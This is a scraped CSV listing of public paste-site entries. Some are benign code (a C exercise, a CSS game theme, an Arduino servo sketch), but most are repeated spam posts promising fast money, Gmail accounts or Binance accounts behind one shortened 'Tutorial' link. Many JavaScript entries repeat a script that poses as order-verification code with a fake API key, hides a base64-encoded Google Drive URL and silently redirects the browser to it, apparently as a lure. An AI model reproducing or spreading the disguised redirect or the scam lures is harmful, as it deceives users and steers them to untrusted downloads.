id,title,username,language,date,content
7h4A9Z3V,EARN $900 INSTANTLY 2025 9A,Techpreston1222,JavaScript,Monday 24th of March 2025 07:06:27 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

lhbwGWxhIY
"
XqYeSbx8,Random Gmail Acc C2,Techpreston1222,JavaScript,Monday 24th of March 2025 07:04:20 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

7F8y6BEbZZ
"
7uJ73mUh,Make $1000 15-MINUTES (BEGINNER) 2A,Techpreston1222,JavaScript,Monday 24th of March 2025 07:02:17 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

eKBQJUOZVf
"
TGSJxJy0,Binance account 0N,Techpreston1222,JavaScript,Monday 24th of March 2025 07:00:13 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

nxnYSzfg43
"
0yAL6NMH,dataNone,TestGuy1,JSON,Monday 24th of March 2025 07:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b5202de42f62bc0fb2fa1693df48d1a15ad26819ed44465624bb579d1dbddb771954d56668b539eb47044e7b5cd42efa116d90207f25497f0b5b9d517a77df99cc496f5b6727046bf440fc232d0dfe785077d0322385ae67a1cf751887c3c4ed62bb9d6ab53e1e068ba88e2710babffd94ec7daf4b3aee7f2048e82314435d91',
  otherdata: [
    '0fb0fb7269ea9a3126e0822610ac62fd',
    'e63e392d542da7a121a12ae5c36299be',
    'ee21c97768e649a079350ae0a0108cbb',
    'fc0da04f83ab7d2e614840f4e521dbc0',
    'b7167f3f952705c20644c5af4b12e612',
    'c67ff24303d1de9aae13fc5e9dc1212a',
    '7abc77b4c0ba18aa968399cd35e404b9',
    '0312d4496abb6c5484783bde8725ecfa'
  ]
}"
hbJArVt9,EARN $900 INSTANTLY 2025 9A,Techpreston1222,JavaScript,Monday 24th of March 2025 06:58:06 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

kDQh6JnSkc
"
JrSQDiT2,Random Gmail Acc C2,Techpreston1222,JavaScript,Monday 24th of March 2025 06:56:02 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

gtcPELubTw
"
KN8wV01N,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:53:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/146/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iAgAkEi8,Make $1000 15-MINUTES (BEGINNER) 2A,RedXetHoil,JavaScript,Monday 24th of March 2025 06:53:04 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

uditBdcOg1
"
rVH5sBEt,Binance account 0N,nielshacket,JavaScript,Monday 24th of March 2025 06:49:07 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

DxLQHhG9wv
"
8hFrtF8Q,EARN $900 INSTANTLY 2025 9A,nielshacket,JavaScript,Monday 24th of March 2025 06:47:04 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

wuKD9dEgzs
"
dmwx6YMH,Random Gmail Acc C2,nielshacket,JavaScript,Monday 24th of March 2025 06:44:56 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

vJ3wMU4gbZ
"
yFeKJPuF,Make $1000 15-MINUTES (BEGINNER) 2A,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:42:11 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

u3Zp2jLKzu
"
267yXfaq,Binance account 0N,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:40:03 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

S0aHJrMMtW
"
tS4AiLAL,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:38:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0q26t1Bz,EARN $900 INSTANTLY 2025 9A,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:37:57 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

xlQub4om21
"
e6FChb8i,Random Gmail Acc C2,Bonniebonnie,JavaScript,Monday 24th of March 2025 06:35:53 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

iSmVXQbrXZ
"
8wa5GesX,Make $1000 15-MINUTES (BEGINNER) 2A,LavenderInk,JavaScript,Monday 24th of March 2025 06:33:31 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

1PxZ6wC03q
"
a7gHWhmq,Binance account 0N,LavenderInk,JavaScript,Monday 24th of March 2025 06:31:26 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

5GMwaFznaQ
"
2rn85py3,EARN $900 INSTANTLY 2025 9A,LavenderInk,JavaScript,Monday 24th of March 2025 06:29:16 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

B8X3Zs6X56
"
FU0UPAkK,Random Gmail Acc C2,LavenderInk,JavaScript,Monday 24th of March 2025 06:27:06 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

IODnJ5nt0v
"
TKVACyEz,Make $1000 15-MINUTES (BEGINNER) 2A,LavenderInk,JavaScript,Monday 24th of March 2025 06:25:01 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

t82NR8S8QR
"
8g5TGNpW,Untitled,dllbridge,C,Monday 24th of March 2025 06:24:37 AM CDT,"

#include <stdio.h>

int  main()
{
	int v = 0, b = 0, nRes = 0;
		printf(""Enter  number"");
	scanf(""%d"", &b);
	printf(""Enter  number"");
	scanf(""%d"", &v);
	
	nRes = (v >b) ? v : b;  // Придумать два примера с этим оператором
	
	printf(""%d"", nRes);

}

















/*
#include   <stdio.h>
#include  <locale.h>   


/////////////////////////////////////////////////
void printBinary(int num)                      //  
{
    
    int numBits = 32;


    for (int i = numBits - 1; i >= 0; i--)     // Перебираем все биты, начиная со старшего
	{
    
        if(num & (1 << i))  printf(""1"");       // Проверяем, установлен ли текущий бит
	    else                printf(""0"");
        
        if(i % 8 == 0)      printf("" "");       // Добавляем пробел для удобства чтения (например, каждые 8 бит)
        
    }
    printf(""\n"");
}


///////////////////////////////////////////////
int main()                                   //
{
	
	setlocale(LC_ALL, ""rus"");
	
	
    int num = 42; 
    
	printf(""Десятичное число: %d\n"", num);
    printf(""Двоичное представление: "");
    
	printBinary(num);

return 0;
}

*/
"
zK9fHBgC,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:23:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/002/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eX90vFSj,Binance account 0N,LavenderInk,JavaScript,Monday 24th of March 2025 06:22:57 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

cA3VqsuKH4
"
6uXAvDzG,EARN $900 INSTANTLY 2025 9A,add12q,JavaScript,Monday 24th of March 2025 06:20:24 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

6R3ow9kpwY
"
3Rsm6byB,Random Gmail Acc C2,add12q,JavaScript,Monday 24th of March 2025 06:18:19 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

GQwuYYNFez
"
yfcejQjA,Make $1000 15-MINUTES (BEGINNER) 2A,add12q,JavaScript,Monday 24th of March 2025 06:16:14 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

l6ympx9gY4
"
4qzt4zq4,Binance account 0N,add12q,JavaScript,Monday 24th of March 2025 06:14:01 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

LUHTg7YzDm
"
cjb4GtMk,EARN $900 INSTANTLY 2025 9A,add12q,JavaScript,Monday 24th of March 2025 06:11:56 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

EQCjRMJcEd
"
3w5bVkcM,Random Gmail Acc C2,add12q,JavaScript,Monday 24th of March 2025 06:09:52 AM CDT," 
Tutorial: https://shorturl.gg/ORmzwO

Enjoy

ZeqhkcyKzJ
"
5PCa3EUP,Untitled,Shevierom,JavaScript,Monday 24th of March 2025 06:07:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/674/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Vm3tnr6N,CHICSS,Turgen,CSS,Monday 24th of March 2025 05:58:14 AM CDT,"#game
  {
    background:#00110e;
	background-size: cover;
	font-family: DejaVu Sans Mono, monospace;
	letter-spacing: 1px;
	font-stretch: ultra-expanded
    color:#ffc000;
  }


.box
{
	text-align:left;
	padding: 0px;
	box-shadow:none;
}
#box-res.fullWidth
{
	text-align:center;
	width:100%;
	top:0%;
	height:5%;
	min-height:32px;
	z-index:100;
	position:absolute;
	color:#ffc000 !important;
}
.box-header,.box-footer,.box-bit
{
	background:#ffc000;
	color:#00110e;
	
}

.box-header{
	font-size: 20px;
  	font-style: italic;
	font-weight: 1000;
	text-align: start;
	padding-left: 20px;
}
.box-bit{border-radius:0px;}

.box-header
{
	border-bottom-left-radius:0px;
	border-bottom-right-radius:0px;
	margin-bottom:0px;
}
.box-footer
{
	border-top-left-radius:0px;
	border-top-right-radius:0px;
	margin-top:4px;
}


#box-main
{
	left:0px;
	top:0px;
	bottom:0px;
	overflow:hidden;
	width:19%;
	position:absolute;
margin-bottom: 1%;
	margin-left: 1%;
	margin-right: 1%;
}

#box-buttons
{
	top:0px;
	right:0px;
	bottom:0px;
	left:0px;
	position:absolute;
}
#box-store
{
	right:0px;
	top:32px;
	bottom:0px;
	width:80% !important;
	position:absolute;
	margin-bottom: 1%;
	margin-left: 1%;
	margin-right: 1%;
}
#box-buildings,#box-upgrades, #box-buildings2,#box-upgrades2
{
	top:0px;
	bottom:0px;
	width:49%;
	right:0%;
	overflow-x:hidden;
	overflow-y:auto;
	position:absolute;
}
#box-buildings, #box-upgrades2
{right:51%;}

#box-buildings, #box-upgrades
{bottom: 52%;}






.thing
{
	display:inline-block;
	padding:0px;
	margin:0px;
	cursor:pointer;
}
.thing:hover,.thing.lit
{
	background:#ffc000;
}



.upgrade.owned,.achiev.owned
{
	color:#ffc000;
	background:#00000000;
}
.thing-text,.thing-costs{

font-weight:bold;
font-size: 16px;

}

.building
{
	border-top-left-radius:0px;
	border-bottom-left-radius:0px;
	display:block;
	margin-right:0px;
	font-size:14px;
}
.building, .upgrade{
padding-left: 4px;
}


.fullWidth
{
	display:block;
	margin-left:0px;
	margin-right:0px;
	z-index:10;
}
#game .fullWidth
{
	height:auto;
	min-height:auto;
}

.fullWidth:before,.fullWidth:after
{
	content:'';
	height:1px;
	position:absolute;
	left:0px;
	right:0px;
	z-index:-1;
}
.fullWidth:before{top:-1px;}
.fullWidth:after{bottom:-1px;}

.fullWidth .thing-icon
{
	margin-top:0px;
	margin-bottom:0px;
}
.fullWidth .thing-text
{
	margin-top:0px;
	margin-bottom:0px;
}



#box-buildingsHeader{
top: 0px;
width:49%;
left: 0%;
position: absolute;
height: 32px;




}

#box-upgradesHeader{
top: 0px;
width:49%;
right: 0%;
position: absolute;
height: 32px;
}

#box-buildings2Header{
top: 51%;
width:49%;
right: 0%;
position: absolute;
height: 32px;




}

#box-upgrades2Header{
top: 51%;
width:49%;
left: 0%;
position: absolute;
height: 32px;
}

#box-logHeader{
opacity: 1;
position: absolute;
top: 51%;
width: 86%;
left: 0px;
height: 32px;
margin-left: 2%;
margin-right: 2%;
}


#box-buildingsHeader:before, #box-upgradesHeader:before, #box-buildings2Header:before, #box-upgrades2Header:before, #box-logHeader:before{

height: 10px;


	content: '';
    position: absolute;
    top: 0; left: 0;
    border-top: 16px solid #00110e;
    border-right: 16px solid #ffc000;
    width: 0;
}






#box-buildings, #box-upgrades{
top: 32px;
border: thick solid #ffc000;
color:#ffc000;
}

#box-buildings2, #box-upgrades2{

top: 51%;
margin-top: 32px;
border: thick solid #ffc000;
color:#ffc000;
}

.building:hover, .upgrade:hover{
transition: 0.2s;
color: #00110e;
background: #ffc000;

}

.building:active, .upgrade:active{
transition: 0.3s;
color: #ffc000;
background: #00110e;

}

#bulkDisplay{
position: absolute;
left: 0%;
top: 0px;
}
.upgrade{
width:100%;

}

.thing-text, .thing-costs{

padding: 8px;
text-shadow: 0px 0px 0px #000;

}.box{
text-shadow: 0px 0px 0px #000;

}

#box-log{
position: absolute !important;
opacity: 1 !important;
top: 51%;
margin-top: 32px;
left: 0% !important;
bottom: 0%;
width: 86% !important;
background:#00110e;
color:#ffc000;
border: thick solid #ffc000;

	margin-left: 2%;
	margin-right: 2%;
}
#logOuter{
background:#00110e;
color:#ffc000;


}
#logInner{
display: flex;
flex-direction: column;
padding: 5%;
background:#00110e;
color:#ffc000;
overflow:auto;
}
 
#box-things-Buttons{
position: absolute;
height: 50%;
top: 0%;
width: 100%;
}

.wobble {
    animation: wobble 0.5s;
    animation-duration: 0.5s;
    transition: transform 1.00s ease-out;
   
}
 
@keyframes wobble {
0% {
    opacity: 0.7;
    transform: scale(1);
}
5% {
    opacity: 1;
    transform: scale(0.9);
}
100%
    opacity: 1;
    transform: scale(1);
}
}
::-webkit-scrollbar{
width: 0.5vw !important;

}
#log::-webkit-scrollbar, #box-upgrades::-webkit-scrollbar, #box-buildings::-webkit-scrollbar, #box-upgrades2::-webkit-scrollbar, #box-buildings2::-webkit-scrollbar {
    width: 0.5vw !important;
}
#log::-webkit-scrollbar-thumb, #box-upgrades::-webkit-scrollbar-thumb, #box-buildings::-webkit-scrollbar-thumb, #box-upgrades2::-webkit-scrollbar-thumb, #box-buildings2::-webkit-scrollbar-thumb {
   background: #ffc00099 !important;
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}
#log::-webkit-scrollbar-thumb:hover, #box-upgrades::-webkit-scrollbar-thumb:hover, #box-buildings::-webkit-scrollbar-thumb:hover, #box-upgrades2::-webkit-scrollbar-thumb:hover, #box-buildings2::-webkit-scrollbar-thumb:hover {
   background: #ffc000 !important;
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
}

#log::-webkit-scrollbar-track, #box-upgrades::-webkit-scrollbar-track, #box-buildings::-webkit-scrollbar-track, #box-upgrades2::-webkit-scrollbar-track, #box-buildings2::-webkit-scrollbar-track {
   background: #00110e !important;
    box-shadow: 0px 0px 0px 0px #333 inset, 0px 0px 0px 0px #999 inset, 0px 0px 0px 0px #fff inset;
  
}

.thing.bigButton{
position: absolute !important;
margin-left: -100%;
margin-top: -30%;
margin-right: 10%;

position: absolute;
width: 10vw;
height: 10vw;
top: 28vh;
left: 23vw;
}

.thing.bigButton .thing-icon{


background-size: contain !important;
}

.popup, #tooltip, .toast {
    background: #00110e;
    color: #ffc000 ;
    border-radius: 0px;
    box-sizing: border-box;
    padding: 8px 8px;
 	border: thick solid #ffc000;
	box-shadow: none !important;
	text-shadow: none !important;

font-weight:bold;
}

 
#tooltipContent{
color: #ffc000;
font-weight: 100;
 
font-weight:bold;
}

#tooltip .desc, .listing.b, .listing b, .desc b{

color: #ffc000;

}
#tooltip .thing-icon{

}.tooltipPoint{
border: 0px !important;
box-shadow: none !important;
text-shadow: none !important;
color: #ffc000;
visibility: hidden;
}
#box-things-sortup, #box-things-sortup2, #box-things-Upgrades, #box-things-upgrades2  /*if necessary, change this to the name of the box containing your upgrades. it should start with ""box-things"" and you can use inspect element to find it*/
{
    display:flex;
    flex-wrap:wrap;
    justify-content:center; /*you can change this to ""flex-start"" if you want upgrades aligned to the left*/
	flex-direction: column-reverse;
}

#box-things-Buildings, #box-things-buildings2{
	display:flex;
    flex-wrap:wrap;
    justify-content:center; /*you can change this to ""flex-start"" if you want upgrades aligned to the left*/
	flex-direction: column-reverse;
}

.tag-sortup, .tag-sortup2, .building, .upgrade2.notOwned, .upgrade2.cantAfford{
    order:3;
}
.upgrade.notOwned {
    order:3;
}
.upgrade.owned, .upgrade2.owned
{
    order:1;
}
.achiev:hover{
margin-right: -1px;
border: 1px solid #ffc000;
color: #00110e;
background: #ffc000;

}.achiev{
margin-right: -1px;
border: 1px solid #ffc000;
color: #ffc000;
background: #00110e;

}

.systemButton{
    cursor: pointer;
    display: inline-block;
    font-weight: bold;
    background: #00110e;
    box-shadow: none;
    padding: 4px 6px;
    margin: 2px;
    position: relative;
border: 1px solid #ffc00099;
}
.systemButton:hover {
    
    background: #00110e;
    
border: 1px solid #ffc000;
}

.tickbox.on:before {
    background: #ffc000;
	box-shadow: none;
}

.tickbox, .footerTitle{
color: #ffc000;
}

.tickbox:before{
background: #00110e;
}
"
Fx9Qjn7a,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:51:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/082/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7SGRZZc0,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:36:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/235/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tWRKHE29,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:21:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/916/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MMkH9VPV,"""Sequential Control"" rev_02",pleasedontcode,Arduino,Monday 24th of March 2025 05:19:45 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Sequential Control""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-03-24 10:18:26

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* make it work */
/****** SYSTEM REQUIREMENT 2 *****/
	/* doesnt count */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <Servo.h>	//https://github.com/arduino-libraries/Servo

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t button_PushButton_PIN_D2		= 2; // This is the pin for the button

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo servo1; 
Servo servo2;
Servo servo3;
Servo servo4;
Servo servo5;
Servo servo6;
Servo servo7;

void setup(void)
{
	// put your setup code here, to run once:
	pinMode(button_PushButton_PIN_D2, INPUT_PULLUP); // Using INPUT_PULLUP for button

	// Attach servos to their respective pins
	servo1.attach(11);
	servo2.attach(10);
	servo3.attach(3);
	servo4.attach(4);
	servo5.attach(5);
	servo6.attach(6);
	servo7.attach(7);

	// Initialize servos to a starting position
	servo1.write(180);
	servo2.write(180);
	servo3.write(180);
	servo4.write(180);
	servo5.write(180);
	servo6.write(180);
	servo7.write(180);
}

static int buttoncount = 0; // Moved outside of loop for global access

void loop(void)
{
	// put your main code here, to run repeatedly:
	int button = digitalRead(button_PushButton_PIN_D2); // Read the button state

	if (button == HIGH) {
		buttoncount += 1;
		if (buttoncount == 1) {
			servo1.write(180);
			servo2.write(180);
			servo3.write(180);
			servo5.write(180);
			servo6.write(180);
		}
		if (buttoncount == 2) {
			servo4.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo3.write(90);
			servo2.write(90);
			servo6.write(180);
		}
		if (buttoncount == 3) {
			servo3.write(180);
			servo1.write(90);
			servo7.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
		}
		if (buttoncount == 4) {
			servo6.write(90);
			servo5.write(90);
			servo7.write(90);
			servo4.write(90);
			servo1.write(180);
			servo2.write(180);
		}
		if (buttoncount == 5) {
			servo1.write(90);
			servo6.write(90);
			servo5.write(90);
			servo4.write(90);
			servo2.write(90);
			servo7.write(180);
		}
		if (buttoncount == 6) {
			servo3.write(90);
		}
		if (buttoncount == 7) {
			servo7.write(90);
			servo6.write(180);
			servo5.write(180);
			servo2.write(180);
			servo3.write(180);
		}
		if (buttoncount == 8) {
			servo2.write(90);
			servo3.write(90);
			servo5.write(90);
			servo6.write(90);
		}
		if (buttoncount == 9) {
			servo3.write(180);
		}
		if (buttoncount == 10) {
			servo3.write(90);
			servo5.write(180);
		}
	}
}

/* END CODE */"
i1rB68UJ,Untitled,x41w,JavaScript,Monday 24th of March 2025 05:05:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/947/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H3MmeiWp,Untitled,x41w,JavaScript,Monday 24th of March 2025 04:50:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/369/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

